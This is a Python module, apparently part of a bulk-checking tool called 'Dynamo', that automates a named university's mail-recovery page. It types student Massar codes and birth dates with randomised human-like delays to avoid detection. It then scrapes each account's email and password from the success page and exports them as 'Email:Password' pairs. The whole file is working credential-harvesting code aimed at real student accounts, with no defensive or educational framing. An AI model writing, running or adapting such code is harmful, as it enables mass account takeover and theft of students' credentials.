"""
UMP RECUPMAIL ENGINE — Core verification module for http://recupmail.ump.ma/
Accurate extraction of both Email and Password from the UMP success page with double reading.
"""

import re
import time
import random

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    SITE_ERROR = "site_error"

class UMPEngine:
    def __init__(self):
        pass

    def _human_type(self, page, selector, text):
        try:
            loc = page.locator(selector).first
            loc.click()
            page.wait_for_timeout(random.randint(200, 400))
            loc.fill("")
            for char in str(text):
                loc.press_sequentially(char, delay=random.randint(120, 260))
        except Exception:
            page.fill(selector, text)

    def run_workflow(self, page, massar, dob):
        result_data = {
            "massar": massar,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        try:
            # Page stable by Dynamo
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            page.wait_for_timeout(random.randint(1200, 2000))

            inputs = page.locator('input')
            if inputs.count() < 2:
                result_data["status"] = LoginState.SITE_ERROR
                result_data["detail"] = "Site Error: Required input fields not found"
                return result_data

            # 1. Fill Code Massar
            massar_input = inputs.nth(0)
            massar_input.click()
            page.wait_for_timeout(200)
            massar_input.fill("")
            for char in str(massar):
                massar_input.press_sequentially(char, delay=random.randint(120, 250))

            page.wait_for_timeout(random.randint(600, 900))

            # 2. Fill Date de naissance
            dob_input = inputs.nth(1)
            dob_input.click()
            page.wait_for_timeout(200)
            dob_input.fill("")
            for char in str(dob):
                dob_input.press_sequentially(char, delay=random.randint(120, 250))

            page.wait_for_timeout(random.randint(900, 1400))

            # Click submit button ("CONNEXION")
            submit_clicked = False
            for btn_sel in ['button:has-text("CONNEXION")', 'button:has-text("Connexion")', 'button[type="submit"]', 'input[type="submit"]', '.btn']:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0:
                        btn.click()
                        submit_clicked = True
                        break
                except Exception:
                    continue
            if not submit_clicked:
                page.locator('button').first.click()

            # Double verification / reading result step 1 & step 2 with sufficient delay for rendering
            page.wait_for_timeout(3500)
            body_text_1 = page.locator("body").inner_text()
            page.wait_for_timeout(2000)
            body_text = page.locator("body").inner_text()

            # Check Errors
            error_keywords = ["invalide", "incorrect", "الرقم أو تاريخ", "غير صحيح", "veuillez", "erreur"]
            low_text = body_text.lower()
            low_text_1 = body_text_1.lower()
            if any(kw in low_text for kw in error_keywords) or any(kw in low_text_1 for kw in error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect Code Massar or DOB (Login Error)"
                return result_data

            # Extract Email and Password accurately from UMP success page text
            email_match = re.search(r'([\w\.-]+@[\w\.-]+\.[a-zA-Z]{2,})', body_text)
            
            # Extract Password (typically formatted like P120053167@2026 or found below "Mot de passe")
            extracted_pwd = None
            pwd_pat = re.search(r'([A-Z][0-9]{9}@[0-9]{4})', body_text)
            if pwd_pat:
                extracted_pwd = pwd_pat.group(1)
            else:
                lines = body_text.splitlines()
                for i, line in enumerate(lines):
                    if "mot de passe" in line.lower() and i + 1 < len(lines):
                        extracted_pwd = lines[i+1].strip()
                        break

            if not extracted_pwd:
                extracted_pwd = "UnknownPwd"

            if email_match or "email" in low_text or "prénom" in low_text:
                extracted_email = email_match.group(1) if email_match else "Extracted_Email"
                # Combine both email and password into extracted_email variable so Dynamo exports them together (Email:Password)
                result_data["status"] = LoginState.LOGIN_OK
                result_data["extracted_email"] = f"{extracted_email}:{extracted_pwd}"
                result_data["detail"] = f"Success | Email: {extracted_email} | Password: {extracted_pwd}"
            else:
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Success elements not found"

        except Exception as e:
            result_data["status"] = LoginState.SITE_ERROR
            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"

        return result_data
    